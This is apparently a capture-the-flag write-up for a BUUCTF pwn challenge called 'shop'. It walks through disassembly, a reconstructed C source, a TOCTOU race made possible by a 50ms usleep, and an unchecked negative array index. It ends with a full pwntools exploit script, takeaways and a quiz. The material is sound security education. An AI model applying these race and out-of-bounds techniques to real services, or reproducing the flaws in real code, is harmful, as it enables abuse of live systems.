// BUUCTF · PWN · Challenge #20

# shop — Race Condition + OOB Index

PWN Easy x86-64 TOCTOU Out-of-Bounds pthreads

A multi-threaded shop binary where a 50ms `usleep` between a coin credit and slot-clear creates a race window wide enough to duplicate inventory sales. No shell required — the flag is already in memory at a fixed address. Pure logic-level exploit.

01 / RECON

## Reconnaissance

```
$ file shop
shop: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ nm -C ./shop | grep " T " | awk '{print $3}' | tr '\n' '  '
buy  game  init  look  main  read_int  read_n  sale  to_buy  to_sale

$ strings -t x ./shop | grep bin/sh
(no output)  ← no /bin/sh anywhere
```

| Protection | Status | Implication |
| --- | --- | --- |
| `Canary` | Found | Stack buffer overflow → cannot corrupt return address |
| `NX` | Enabled | Shellcode on stack → won't execute |
| `PIE` | Disabled | All global addresses fixed at 0x400000 base ← useful for us |
| `RELRO` | Partial | GOT is writable, but we won't need it |
| `Stripped` | No | All symbol names intact — disassembly is easy to read |
| `pthread_create` in PLT | Present | Multi-threaded binary → race conditions are on the table |

### Shop Item Prices vs Recycle Value

CHART: BUY PRICE vs RECYCLE PRICE per item — why pen is the ideal race target

02 / BINARY ANALYSIS

## Binary Analysis: Assembly Deep Dive

### Global Memory Layout (fixed, No PIE)

ADDRESS VARIABLE SIZE & DESCRIPTION

0x6020a0

money

int (4B) · starts at 100

0x6020c0

bag\[0\] … bag\[15\]

int\[16\] (64B) · 0=empty 1=flag 2=pen 3=wish

0x6022a0

flag_buf

char\[0x30\] (48B) · raw /flag content

### init() — Flag Loaded at Startup

```
; init() reads /flag into memory BEFORE the game loop starts
400a63:  call   open@plt          ; open("/flag", O_RDONLY)
400a6d:  mov    %eax,-0x4(%rbp)   ; save fd
400a78:  mov    $0x6022a0,%esi    ; dst = flag_buf
400a73:  mov    $0x30,%edx        ; read 48 bytes
400a7f:  call   read@plt          ; read(fd, flag_buf, 0x30)
400a89:  call   close@plt
```

### look() — Our Win Condition

```
; loops i = 0..15, prints based on bag[i]
400b3a:  mov    0x6020c0(,%rax,4),%eax  ; eax = bag[i]
400b41:  cmp    $0x1,%eax              ; if bag[i] == 1 (flag)...
400b44:  je     400b5d

400b5d:  mov    $0x6022a0,%edx         ; arg = flag_buf
400b67:  mov    $0x40108a,%edi         ; format = "[%02d]: flag -> %s\n"
400b71:  call   printf@plt             ; ← prints the flag!
```

### to_sale() — The Vulnerable Thread

```
; Runs in a background thread. Argument: slot index (cast from void*)
400d67:  mov    %edi,-0x4(%rbp)          ; save slot
400d6f:  mov    0x6020c0(,%rax,4),%eax   ; eax = bag[slot]

; credit money immediately
400d82:  mov    0x60214c,%edx            ; recycle_price[flag] = 100
400d88:  mov    0x6020a0,%eax            ; eax = money
400d90:  mov    %eax,0x6020a0            ; money += recycle_price  ← happens NOW

400dc7:  mov    $0xc350,%edi             ; 0xc350 = 50,000 µs = 50ms
400dcc:  call   usleep@plt              ; ← RACE WINDOW IS HERE

400dd6:  movl   $0x0,0x6020c0(,%rax,4)  ; bag[slot] = 0  ← only NOW
```

### sale() — No Bounds Check on Index

```
400e0f:  call   read_int               ; slot = user input — unchecked!
400e1c:  mov    0x6020c0(,%rax,4),%eax  ; *(0x6020c0 + slot*4) — NO bounds check
400e23:  test   %eax,%eax
400e25:  jne    400e33                  ; if non-zero → sell it

400e4f:  call   pthread_create@plt     ; spawn to_sale(slot)
; ← NO pthread_join! main thread returns immediately to the menu.
```

03 / BUGS

## Bug #1 — Race Condition (TOCTOU)

BUG TYPE: TOCTOU — Time Of Check To Time Of Use

The slot-occupied check and the actual slot-clear happen in the **same thread**, but are separated by a 50ms sleep. The main thread is never blocked — it returns to the menu and can accept new input immediately.

### Race Timeline

⬡ Main Thread

⬡ Background Thread (to_sale)

sale() → index=0

bag\[0\] != 0 ✓ (pen exists)

pthread_create(to_sale, 0)

puts("Fair prices!")

return to menu → prompt "> "

sale() → index=0 again ← RACE!

bag\[0\] != 0 ✓ (still pen!)

pthread_create(to_sale, 0)

puts("Fair prices!")

return to menu

·

·

·

money += 99 (→ 199)

usleep(50ms) ← window open

usleep(50ms) ← still sleeping

money += 99 (→ 298) \[thread 2\]

usleep(50ms) \[thread 2\]

bag\[0\] = 0 \[thread 1 wakes\]

bag\[0\] = 0 \[thread 2 wakes\]

**Result:** `money` went from `100` → `199` → `298`. Flag costs 200 → we can buy it now.

### Money Progression Chart

CHART: COIN BALANCE over exploit steps — flag threshold at 200

### Thread Timing — Gantt View

CHART: THREAD EXECUTION TIMELINE — Thread 2 spawns inside Thread 1's usleep window

### Why naive Python breaks the race

```
# WRONG — recvuntil blocks until server responds, eating the 50ms window
sale(0)   # sends input, waits for full menu to print...
sale(0)   # ...by now 50ms has passed. bag[0] already cleared.

# CORRECT — flood stdin before any recvuntil
p.recvuntil(b'> ')   # wait for first prompt only
p.sendline(b'3')     # menu: sale
p.sendline(b'0')     # slot 0 → thread 1 spawned
p.sendline(b'3')     # menu: sale again  ← arrives before 50ms expire
p.sendline(b'0')     # slot 0 → thread 2 spawned while thread 1 sleeps
```

## Bug #2 — Out-of-Bounds Array Index

BUG TYPE: OOB Array Index (unchecked user-controlled index into global array)

sale() passes the user-supplied index directly to `bag[index]` with no bounds check. Since `bag` is a global array at a fixed address, a negative index reaches backwards into memory — directly to other global variables.

### Address Arithmetic

```
; Assembly: eax = *(0x6020c0 + index × 4)
; With index = -8:
target = 0x6020c0 + (-8) × 4
       = 0x6020c0 - 0x20
       = 0x6020a0   ← exactly &money
```

bag base address

0x6020c0

\+ index × 4

index = -8

-8 × 4 = -0x20

→ reaches 0x6020a0 = &money

With `index = -8`, the final write in `to_sale` becomes `money = 0`. This is a **zero-write-anywhere primitive** — not needed here, but dangerous in harder variants of this challenge pattern.

04 / SOURCE

## Reconstructed C Code

```
int  money   = 100;    // 0x6020a0
int  bag[16];          // 0x6020c0  (0=empty 1=flag 2=pen 3=wish)
char flag_buf[0x30];   // 0x6022a0  (filled from /flag at startup)

void *to_sale(void *arg) {
    int slot = (int)(long)arg;    // no bounds check inherited from caller
    int type = bag[slot];          // BUG: slot can be negative → OOB

    if (type == 1) money += 100;  // flag recycle
    if (type == 2) money += 99;   // pen recycle  ← credited NOW

    usleep(50000);                // BUG: 50ms gap — RACE WINDOW

    bag[slot] = 0;               // BUG: only cleared 50ms later
    return NULL;
}

void sale(void) {
    int slot = read_int();       // BUG: no bounds check on slot
    if (bag[slot] != 0) {        // slot=-8 reads &money instead of bag
        pthread_t tid;
        pthread_create(&tid, NULL, to_sale, (void*)(long)slot);
        // NO pthread_join — main thread returns immediately!
    }
}
```

05 / EXPLOIT

## Exploit Development

### Step-by-step Plan

1

Race condition on slot 0 (pen)

Flush two `sale(0)` calls to stdin before any `recvuntil`. Both threads spawn inside the 50ms window. `money: 100 + 99 + 99 = 298`

2

Buy the flag (item 1, costs 200)

298 ≥ 200 → purchase succeeds. `bag[some_slot] = 1`. `money: 298 - 200 = 98`

3

Call look() to print the flag

`look()` iterates all slots. Finds `bag[i] == 1` → `printf("[%02d]: flag -> %s", i, flag_buf)`

### Final Exploit Script

```
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

if len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    p = remote(host, int(port), ssl=True, sni=host)
else:
    p = process('./shop')

def buy(item):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(str(item).encode())

def look():
    p.recvuntil(b'> ')
    p.sendline(b'1')

# ── Step 1: Race Condition ─────────────────────────────────────────────
# Receive the first prompt, then send both sale sequences immediately.
# No recvuntil between sends → both arrive within the 50ms window.
p.recvuntil(b'> ')
p.sendline(b'3')     # select sale
p.sendline(b'0')     # slot 0 → thread 1 spawns, money += 99
p.sendline(b'3')     # select sale again — arrives before thread 1 clears bag[0]
p.sendline(b'0')     # slot 0 → thread 2 spawns, money += 99
# money is now 100 + 99 + 99 = 298

# ── Step 2: Buy the flag ───────────────────────────────────────────────
buy(1)               # costs 200; money: 298 → 98; bag[slot] = 1

# ── Step 3: Print the flag ─────────────────────────────────────────────
look()               # look() sees bag[i]==1 → prints flag_buf

p.interactive()
```

06 / TAKEAWAYS

## Key Takeaways

01

pthread_create without pthread_join = race candidate

If a thread modifies shared state and the caller doesn't join, ask: is there a delay between the check and the write? That gap is your window.

02

recvuntil kills timing

Waiting for server responses between inputs adds enough latency to close a 50ms race window. Send everything at once, collect output later.

03

OOB index ≠ buffer overflow

An unchecked global array index lets you aim at any address with arithmetic: `base + index × size`. Negative index reaches backwards.

04

Not every PWN needs a shell

The flag was already loaded into memory at startup. Win condition was triggering a print — no code execution required.

05

Canary + NX ≠ safe

Both mitigations were active, yet completely irrelevant. They protect memory layout attack surfaces — not application-logic bugs.

07 / QUIZ

## Quiz — Test Your Understanding

Q1 usleep(0xc350) — what is that in ms, and why does the exact value matter? ▶

**50ms** (0xc350 = 50,000 µs). The value defines the race window width. Larger = easier to win; smaller = harder. The exploit works because even a local IPC round-trip is well under 50ms when you batch all sends.

Q2 Why does sale() have an OOB bug but buy() does not? ▶

`buy()` validates: `if (choice != 1 && choice != 2 && choice != 3) return;`. `sale()` reads a slot index and uses it directly in `bag[index]` with zero range validation.

Q3 What index reaches &money? Show the calculation. ▶

```
target  = 0x6020a0
base    = 0x6020c0
offset  = 0x6020a0 - 0x6020c0 = -0x20 = -32 bytes
index   = -32 / 4 = -8
```

Pass `index = -8`. After 50ms, `to_sale` writes 0 to `bag[-8]` = `&money` → `money = 0`.

Q4 Why does adding recvuntil between the two sale sends break the exploit? ▶

`recvuntil` blocks Python until the full menu is printed by the server. That takes longer than 50ms. By the time the second `sale` is sent, the background thread has already executed `bag[0] = 0`, so the check fails and the sell is rejected.

Q5 This binary has Canary and NX. Why were they both completely irrelevant? ▶

Canary detects stack buffer overflows. NX prevents shellcode execution on the stack. This exploit never overflows a buffer and never injects code — it manipulates application-level state (coin balance) via a race condition to purchase an item whose display routine prints a flag already in memory.